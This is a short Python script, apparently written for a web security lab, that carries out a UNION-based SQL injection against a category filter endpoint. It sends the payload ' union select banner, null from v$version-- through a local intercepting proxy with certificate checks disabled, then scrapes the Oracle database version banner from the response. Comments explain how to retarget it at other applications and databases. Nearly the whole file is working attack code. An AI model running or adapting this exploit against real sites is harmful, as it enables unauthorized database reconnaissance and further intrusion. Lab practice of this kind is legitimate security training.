import sys;
import requests;
import urllib3;
from bs4 import BeautifulSoup;
import re;

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def exploit_sqli_users_table(url):
    path = '/filter?category=Tech+gifts' #change according to the target application
    sql_payload = "' union select banner, null from v$version--" #change according to the target database, this is for Oracle DB    
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies) 
    res = r.text
    if "ersion" in res: #change according to the target database, but this one is generic, it is for multiple databases
        print("[+] Found the web server details...")
        soup = BeautifulSoup(res, 'html.parser')
        version = soup.find(string=re.compile('.*Oracle\\sDatabase.*')) #the regular expression may change according to the database and it starts and/or many end with any number of characters
        print("[+] Web server details: " + version)
        return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s https://www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    print("[+] Getting details of the web server...")
    if not exploit_sqli_users_table(url):
        print("[-] Unable to get the web server details.")